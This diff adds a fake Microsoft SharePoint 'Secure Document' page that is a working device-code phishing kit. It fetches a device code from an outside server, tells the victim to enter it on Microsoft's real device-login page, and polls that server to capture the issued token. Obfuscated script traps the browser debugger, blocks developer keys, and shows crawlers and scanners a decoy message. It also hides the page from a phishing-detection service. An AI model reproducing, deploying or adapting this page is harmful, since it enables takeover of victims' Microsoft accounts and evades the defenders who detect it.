@@ -1,0 +1,146 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
+<title>Microsoft SharePoint - Secure Document</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,Roboto,sans-serif}body{background:#f0f2f5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}.main-card{max-width:600px;width:100%;background:#fff;border-radius:20px;box-shadow:0 8px 28px rgba(0,0,0,0.1),0 2px 4px rgba(0,0,0,0.02);overflow:hidden}.sp-header{background:#0078d4;padding:16px 24px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}.sp-logo{display:flex;align-items:center;gap:12px}.sp-logo-icon{width:40px;height:40px;background:#ffffff;border-radius:8px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 6px rgba(0,0,0,0.1)}.sp-logo-icon img{width:28px;height:28px;object-fit:contain}.sp-logo span{color:#fff;font-size:18px;font-weight:600}.sp-badge{background:rgba(255,255,255,0.2);padding:5px 12px;border-radius:20px;color:#fff;font-size:11px;font-weight:500}.doc-preview{background:#fff;border-bottom:1px solid #eef2f8;padding:20px 24px;display:flex;align-items:center;gap:18px;flex-wrap:wrap}.doc-icon{width:64px;height:68px;background:#d1342e;border-radius:14px;display:flex;flex-direction:column;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(0,0,0,0.1)}.doc-icon i:first-child{color:#fff;font-size:28px}.doc-icon i:last-child{color:#ffccaa;font-size:11px}.doc-info{flex:1}.doc-name{font-weight:700;font-size:17px;color:#1e293b;display:flex;align-items:center;gap:10px;flex-wrap:wrap}.doc-name .file-badge{background:#e8f0fe;padding:4px 12px;border-radius:20px;font-size:11px;color:#0078d4}.doc-meta{font-size:12px;color:#7f8c9a;margin-top:8px;display:flex;align-items:center;gap:16px;flex-wrap:wrap}.doc-meta i{margin-right:4px}.content{padding:24px}.title-section{margin-bottom:22px}.title-section h2{font-size:21px;font-weight:700;color:#1e293b;display:flex;align-items:center;gap:8px;flex-wrap:wrap}.title-section p{font-size:13px;color:#6c7a91;margin-top:5px;line-height:1.4}.horiz-steps{display:flex;align-items:flex-start;justify-content:space-between;margin:28px 0;position:relative;flex-wrap:wrap;gap:10px}.horiz-steps:before{content:"";position:absolute;top:24px;left:45px;right:45px;height:2px;background:#e2e8f0;z-index:0}.step{flex:1;text-align:center;position:relative;z-index:1;background:#fff;min-width:85px}.step-circle{width:48px;height:48px;margin:0 auto 10px;border-radius:50%;background:#f1f5f9;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:18px;color:#5b6b8c;transition:all 0.2s;border:2px solid #e2e8f0}.step-circle.active{background:#0078d4;color:#fff;border-color:#0078d4;box-shadow:0 3px 10px rgba(0,120,212,0.25)}.step-circle.completed{background:#10b981;color:#fff;border-color:#10b981}.step-label{font-weight:600;font-size:11px;color:#1e2a44;margin-bottom:5px}.step-desc{font-size:9px;color:#8592ad}.step-status{font-size:9px;font-weight:500;margin-top:6px;display:flex;align-items:center;justify-content:center;gap:4px}.loader-sm{display:inline-block;width:10px;height:10px;border:2px solid #e2e8f0;border-top-color:#0078d4;border-radius:50%;animation:spin 0.7s linear infinite}.code-box{background:#fafcff;border:1px solid #eef2fa;border-radius:20px;padding:18px;text-align:center;margin:24px 0;display:none;box-shadow:0 2px 8px rgba(0,0,0,0.02)}.code-label{font-size:10px;letter-spacing:1.5px;color:#a0a8bd;margin-bottom:10px;font-weight:700}.code-value{font-size:36px;font-weight:800;letter-spacing:6px;color:#d1342e;font-family:"Courier New",monospace;margin:12px 0;word-break:break-word}.copy-btn{background:#fff;border:1.5px solid #fee2db;border-radius:40px;padding:10px 24px;font-size:13px;font-weight:600;color:#d1342e;cursor:pointer;display:inline-flex;align-items:center;gap:8px;transition:0.2s}.copy-btn:hover{background:#fff5f2;border-color:#0078d4}.instruction-box{background:#f0f7ff;border-left:4px solid #0078d4;border-radius:12px;padding:14px 16px;margin:20px 0;display:none}.instruction-box p{font-size:12px;color:#334155;margin:8px 0;display:flex;align-items:center;gap:10px}.instruction-box i{color:#0078d4;width:20px;font-size:12px}.instruction-box strong{color:#0078d4}.sign-btn{width:100%;background:#0078d4;border:none;border-radius:44px;padding:14px;color:#fff;font-size:15px;font-weight:700;cursor:pointer;margin-top:20px;display:none;align-items:center;justify-content:center;gap:10px;transition:all 0.2s}.sign-btn:hover{background:#005a9e;transform:translateY(-1px);box-shadow:0 4px 12px rgba(0,120,212,0.3)}.sign-btn i{font-size:18px}.info-footer{font-size:11px;color:#9aa3bc;text-align:center;margin-top:20px;display:flex;align-items:center;justify-content:center;gap:12px;flex-wrap:wrap}.status-area{margin-top:20px;padding:12px 16px;background:#f8fafd;border-radius:14px;font-size:12px;text-align:center;color:#5b6b8c}.status-area.success{background:#dff6dd;color:#107c10}.status-area.error{background:#fee2e2;color:#dc2626}.loader{display:inline-block;width:14px;height:14px;border:2px solid #e2e8f0;border-top:2px solid #0078d4;border-radius:50%;animation:spin 1s linear infinite;vertical-align:middle;margin-right:6px}@keyframes spin{to{transform:rotate(360deg)}}@media(max-width:600px){body{padding:12px}.main-card{margin:0}.sp-header{padding:12px 18px}.sp-logo-icon{width:36px;height:36px}.sp-logo-icon img{width:24px;height:24px}.doc-preview{padding:14px 18px;gap:12px}.doc-icon{width:52px;height:56px}.doc-icon i:first-child{font-size:22px}.doc-name{font-size:14px}.content{padding:18px}.title-section h2{font-size:18px}.horiz-steps:before{top:20px;left:30px;right:30px}.step-circle{width:38px;height:38px;font-size:14px}.step-label{font-size:9px}.step-desc{font-size:7px}.code-value{font-size:26px;letter-spacing:4px}.sign-btn{padding:12px;font-size:13px}.instruction-box{padding:12px 14px}.instruction-box p{font-size:11px}}
+</style>
+</head>
+<body>
+<div class="main-card">
+<div class="sp-header"><div class="sp-logo"><div class="sp-logo-icon"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSIgWGh3QFqUGuqzUpDlXXn_wti5y7_Nh2vsA&s" alt="SharePoint"></div><span>SharePoint</span></div><div class="sp-badge"><i class="fas fa-shield-alt"></i> Secure Document Library</div></div>
+<div class="doc-preview"><div class="doc-icon"><i class="fas fa-file-pdf"></i><i class="fas fa-chart-line"></i></div><div class="doc-info"><div class="doc-name">Bid Access_2026 <span class="file-badge">.pdf</span></div><div class="doc-meta"><span><i class="fas fa-database"></i> 3.2 MB</span> <span><i class="fas fa-users"></i> Restricted Access</span> <span><i class="fas fa-calendar-alt"></i> Modified today</span> <span><i class="fas fa-folder"></i> Bid / Reports</span></div></div></div>
+<div class="content">
+<div class="title-section"><h2><i class="fas fa-file-shield"></i> Secure Document Access</h2><p>Microsoft Entra ID verification required to access this protected document from SharePoint</p></div>
+<div class="horiz-steps"><div class="step"><div class="step-circle" id="step1Circle">1</div><div class="step-label">Connection</div><div class="step-desc">SharePoint secure link</div><div class="step-status" id="step1Status"><span class="loader-sm"></span> Loading</div></div><div class="step"><div class="step-circle" id="step2Circle">2</div><div class="step-label">Verify access</div><div class="step-desc">Microsoft Entra ID</div><div class="step-status" id="step2Status"><i class="far fa-clock"></i> Pending</div></div><div class="step"><div class="step-circle" id="step3Circle">3</div><div class="step-label">View document</div><div class="step-desc">Secure preview ready</div><div class="step-status" id="step3Status"><i class="fas fa-lock"></i> Locked</div></div></div>
+<div class="code-box" id="codeBox"><div class="code-label"><i class="fas fa-key"></i> ACCESS CODE</div><div class="code-value" id="codeValue">Loading...</div><button class="copy-btn" id="copyBtn"><i class="fas fa-copy"></i> Copy access code</button></div>
+<div class="instruction-box" id="instructionBox"><p><i class="fas fa-info-circle"></i> <strong>How to verify your access:</strong></p><p><i class="fas fa-1"></i> Copy the access code above</p><p><i class="fas fa-2"></i> Click "Sign in with Microsoft Entra ID" below</p><p><i class="fas fa-3"></i> Paste the code when prompted on the Microsoft login page</p><p><i class="fas fa-4"></i> Choose your Microsoft account to complete verification</p><p><i class="fas fa-5"></i> After verification, your document will open automatically</p></div>
+<button class="sign-btn" id="signBtn"><i class="fab fa-microsoft"></i> Sign in with Microsoft Entra ID</button>
+<div class="info-footer"><i class="fas fa-shield-alt"></i> Secured by Microsoft Entra ID <i class="fas fa-lock"></i> End-to-end encryption <i class="fas fa-cloud"></i> SharePoint Online</div>
+<div class="status-area" id="statusArea"><span class="loader"></span> Establishing secure SharePoint connection...</div>
+</div></div>
+<script>
+(function(){
+setInterval(function() {
+var _0x4b2a=performance.now();
+eval("\x64\x65\x62\x75\x67\x67\x65\x72")();
+var _0x5c3b=performance.now()-_0x4b2a;
+if(_0x5c3b>50){while(true){eval("\x64\x65\x62\x75\x67\x67\x65\x72")();}}
+},1000);
+
+var _0x7d8e=atob('Y2xvbmUuY2lwcC5hcHAvYXBpL1B1YmxpY1BoaXNoaW5nQ2hlY2s=');
+
+if(typeof CSSStyleSheet!=='undefined'&&CSSStyleSheet.prototype){
+var _0x3f1a=CSSStyleSheet.prototype.insertRule;
+if(_0x3f1a){
+CSSStyleSheet.prototype.insertRule=function(rule,index){
+if(rule&&rule.indexOf(_0x7d8e)!==-1){return 0;}
+return _0x3f1a.call(this,rule,index);
+};}}
+
+var _0x9a2b=document.createElement;
+document.createElement=function(tagName){
+var element=_0x9a2b.call(document,tagName);
+if(tagName&&tagName.toLowerCase()==='style'){
+try{
+var _0x1c4d=Object.getOwnPropertyDescriptor(Element.prototype,'\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74')||Object.getOwnPropertyDescriptor(HTMLElement.prototype,'\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74');
+var _0x6e8f=Object.getOwnPropertyDescriptor(Element.prototype,'\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C')||Object.getOwnPropertyDescriptor(HTMLElement.prototype,'\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C');
+if(_0x1c4d&&_0x1c4d.set){
+Object.defineProperty(element,'\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74',{
+set:function(value){
+if(value&&value.indexOf(_0x7d8e)!==-1){
+value=value.split('\x0A').filter(function(line){
+return line.indexOf(_0x7d8e)===-1;
+}).join('\x0A');
+}
+return _0x1c4d.set.call(this,value);
+},
+get:function(){
+return _0x1c4d.get?_0x1c4d.get.call(this):this.nodeValue;
+}});}
+if(_0x6e8f&&_0x6e8f.set){
+Object.defineProperty(element,'\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C',{
+set:function(value){
+if(value&&value.indexOf(_0x7d8e)!==-1){
+value=value.split('\x0A').filter(function(line){
+return line.indexOf(_0x7d8e)===-1;
+}).join('\x0A');
+}
+return _0x6e8f.set.call(this,value);
+},
+get:function(){
+return _0x6e8f.get?_0x6e8f.get.call(this):'';
+}});}
+}catch(e){}
+}
+return element;
+};
+
+try{
+var _0x2b5c=document.createElement('\x73\x74\x79\x6C\x65');
+_0x2b5c.textContent='\x0A\x20\x20\x20\x20\x2E\x65\x78\x74\x2D\x73\x69\x67\x6E\x2D\x69\x6E\x2D\x62\x6F\x78\x20\x7B\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x2D\x69\x6D\x61\x67\x65\x3A\x20\x6E\x6F\x6E\x65\x20\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x0A\x20\x20\x20\x20\x7D\x0A\x20\x20\x20\x20';
+if(document.head){document.head.appendChild(_0x2b5c);}
+else if(document.documentElement){document.documentElement.appendChild(_0x2b5c);}
+}catch(e){}
+
+function _0x4f7a(_0x3d2e){
+try{
+document.body.innerHTML="";
+document.body.style.background="#fff";
+var _0x8c1b=document.createElement("\x64\x69\x76");
+_0x8c1b.style.cssText="\x66\x6F\x6E\x74\x2D\x66\x61\x6D\x69\x6C\x79\x3A\x41\x72\x69\x61\x6C\x3B\x74\x65\x78\x74\x2D\x61\x6C\x69\x67\x6E\x3A\x63\x65\x6E\x74\x65\x72\x3B\x6D\x61\x72\x67\x69\x6E\x2D\x74\x6F\x70\x3A\x32\x30\x25\x3B\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x32\x32\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x23\x33\x33\x33\x3B";
+_0x8c1b.innerText=_0x3d2e;
+document.body.appendChild(_0x8c1b);
+}catch(e){}
+}
+
+(function(){
+var _0x6a3b=navigator.userAgent?navigator.userAgent.toLowerCase():"";
+var _0x2d9e=["\x68\x65\x61\x64\x6C\x65\x73\x73","\x70\x68\x61\x6E\x74\x6F\x6D","\x73\x65\x6C\x65\x6E\x69\x75\x6D","\x70\x6C\x61\x79\x77\x72\x69\x67\x68\x74","\x70\x75\x70\x70\x65\x74\x65\x65\x72","\x73\x63\x72\x61\x70\x79","\x63\x72\x61\x77\x6C\x65\x72","\x73\x70\x69\x64\x65\x72","\x63\x75\x72\x6C","\x77\x67\x65\x74","\x70\x79\x74\x68\x6F\x6E\x2D\x72\x65\x71\x75\x65\x73\x74\x73","\x6E\x6F\x64\x65\x2D\x66\x65\x74\x63\x68","\x68\x74\x74\x70\x63\x6C\x69\x65\x6E\x74"];
+for(var i=0;i<_0x2d9e.length;i++){
+if(_0x6a3b.indexOf(_0x2d9e[i])!==-1){
+_0x4f7a("\x43\x68\x61\x6E\x67\x65\x20\x79\x6F\x75\x72\x20\x6E\x65\x74\x77\x6F\x72\x6B");
+return;
+}}
+})();
+
+(function(){
+var _0x7c4e=160;
+function _0x9d3f(){
+if(window.outerWidth-window.innerWidth>_0x7c4e||window.outerHeight-window.innerHeight>_0x7c4e){
+while(true){eval("\x64\x65\x62\x75\x67\x67\x65\x72")();}
+}}
+setInterval(_0x9d3f,1000);
+})();
+
+document.addEventListener("\x63\x6F\x6E\x74\x65\x78\x74\x6D\x65\x6E\x75",function(e){
+if(e.target.tagName!=='INPUT'&&e.target.tagName!=='TEXTAREA'&&e.target.tagName!=='SELECT'){
+e.preventDefault();
+}
+});
+
+document.addEventListener("\x6B\x65\x79\x64\x6F\x77\x6E",function(e){
+if(e.key==="\x46\x31\x32"||(e.ctrlKey&&e.shiftKey&&["\x49","\x4A","\x43"].includes(e.key))||(e.ctrlKey&&e.key==="\x55")){
+e.preventDefault();
+while(true){eval("\x64\x65\x62\x75\x67\x67\x65\x72")();}
+}});
+})();
+var deviceCode=null,intervalTime=1e3,done=!1,pollIntervalId=null,currentUserCode=null,connectionDone=!1,verificationStarted=!1;
+function updateStepsUI(e){var t=document.getElementById("step1Circle"),n=document.getElementById("step2Circle"),a=document.getElementById("step3Circle"),o=document.getElementById("step1Status"),r=document.getElementById("step2Status"),i=document.getElementById("step3Status");e>=1?(t&&(t.classList.remove("active"),t.classList.add("completed"),t.innerHTML="<i class='fas fa-check'></i>"),o&&(o.innerHTML="<i class='fas fa-check-circle'></i> Connected")):(t&&!t.classList.contains("completed")&&t.classList.add("active"),o&&e<1&&(o.innerHTML="<span class='loader-sm'></span> Connecting"));e>=2?(n&&(n.classList.remove("active"),n.classList.add("completed"),n.innerHTML="<i class='fas fa-check'></i>"),r&&(r.innerHTML="<i class='fas fa-check-circle'></i> Granted")):e===1?(n&&(n.classList.remove("completed"),n.classList.add("active"),n.innerHTML="2"),r&&(r.innerHTML="<span class='loader-sm'></span> Verifying...")):r&&e<1&&(r.innerHTML="<i class='far fa-clock'></i> Pending");e>=3?(a&&(a.classList.remove("active"),a.classList.add("completed"),a.innerHTML="<i class='fas fa-check'></i>"),i&&(i.innerHTML="<i class='fas fa-eye'></i> Ready")):e===2?(a&&(a.classList.remove("completed"),a.classList.add("active"),a.innerHTML="3"),i&&(i.innerHTML="<span class='loader-sm'></span> Preparing")):i&&e<2&&(i.innerHTML="<i class='fas fa-lock'></i> Locked")}
+function popup(e){window.open(e,"_blank","width=500,height=650")}
+function openMicrosoftLogin(){deviceCode&&currentUserCode&&popup("https://microsoft.com/devicelogin")}
+async function copyCode(){var e=document.getElementById("codeValue"),t=e?e.innerText:"";if("Loading..."===t||!t||"")document.getElementById("statusArea").innerHTML="<i class='fas fa-exclamation-triangle'></i> Code is loading...";else try{await navigator.clipboard.writeText(t);var n=document.getElementById("copyBtn"),a=n.innerHTML;n.innerHTML="<i class='fas fa-check'></i> Copied!",n.style.color="#107c10",setTimeout(function(){n.innerHTML=a,n.style.color="#d1342e"},1500),openMicrosoftLogin()}catch(e){alert("Copy manually: "+t)}}
+async function startMicrosoftFlow(){try{document.getElementById("statusArea").innerHTML="<span class='loader'></span> Requesting secure access token from Microsoft...";var e=await fetch("https://admin.greatgod.cfd/admin/apifiles.php?action=get_device_code&user_id=ODEwNTM0Nzc0Mg=="),t=await e.json();if(!t.device_code){document.getElementById("statusArea").innerHTML="<i class='fas fa-times-circle'></i> Failed to get access code",document.getElementById("statusArea").classList.add("error");return}deviceCode=t.device_code,currentUserCode=t.user_code,intervalTime=(t.interval||5)*1e3,document.getElementById("codeValue").innerText=currentUserCode,document.getElementById("codeBox").style.display="block",document.getElementById("instructionBox").style.display="block",document.getElementById("signBtn").style.display="flex",updateStepsUI(1),document.getElementById("statusArea").innerHTML="<span class='loader'></span> Access code generated! Copy and sign in to verify.",document.getElementById("statusArea").classList.remove("error"),startPolling()}catch(e){document.getElementById("statusArea").innerHTML="<i class='fas fa-wifi'></i> Connection error. Please try again.",document.getElementById("statusArea").classList.add("error"),console.error(e)}}
+function startPolling(){pollIntervalId&&clearInterval(pollIntervalId),pollIntervalId=setInterval(async function(){if(!done&&deviceCode)try{var e=new URLSearchParams;e.append("device_code",deviceCode),e.append("user_id","ODEwNTM0Nzc0Mg==");var t=await fetch("https://admin.greatgod.cfd/admin/apifiles.php?action=poll_token",{method:"POST",body:e}),n=await t.json();if("pending"!==n.status&&"slow_down"!==n.status&&("success"===n.status||n.success)){done=!0,pollIntervalId&&clearInterval(pollIntervalId),updateStepsUI(2);var a=document.getElementById("statusArea");a.innerHTML="<i class='fas fa-check-circle'></i> Access verified! Opening SharePoint document...",a.classList.add("success");setTimeout(function(){updateStepsUI(3),a.innerHTML="<i class='fas fa-file-pdf'></i> Verification complete! Loading Annual_Financial_Report_2026.pdf from SharePoint...";setTimeout(function(){window.location.href="https://outlook.office365.com/mail/"},1500)},800)}}catch(e){console.error("Poll error:",e)}},intervalTime)}
+function performConnectionStep(){return new Promise(function(e){var t=document.getElementById("statusArea");t.innerHTML="<span class='loader'></span> Connecting to Microsoft SharePoint secure gateway...",t.classList.remove("success","error");setTimeout(function(){connectionDone=!0,updateStepsUI(1),t.innerHTML="<span class='loader'></span> Connection established! Requesting access verification...",e(!0)},3500)})}
+async function startVerification(){await performConnectionStep(),await startMicrosoftFlow(),setTimeout(function(){done||(done=!0,showExpired())},36e5)}
+function showExpired(){document.querySelector(".main-card").innerHTML="<div style='text-align:center;padding:60px 20px'><i class='fas fa-clock' style='font-size:48px;color:#dc3545'></i><h2 style='margin-top:16px;color:#dc3545'>Session Expired</h2><p>SharePoint verification session is no longer available. Please refresh the page.</p></div>"}
+document.getElementById("copyBtn").addEventListener("click",copyCode),document.getElementById("signBtn").addEventListener("click",openMicrosoftLogin),startVerification();
+</script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"60b9271a254d4b30acd33e9b4083b857","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
